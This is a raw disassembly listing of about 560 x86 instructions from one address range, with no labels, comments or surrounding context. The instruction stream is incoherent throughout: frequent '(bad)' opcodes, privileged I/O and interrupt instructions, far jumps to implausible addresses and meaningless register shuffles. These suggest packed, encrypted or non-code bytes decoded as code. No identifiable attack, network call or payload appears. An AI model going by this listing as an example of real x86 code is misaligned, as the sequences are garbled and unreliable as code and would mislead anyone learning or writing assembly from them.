  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
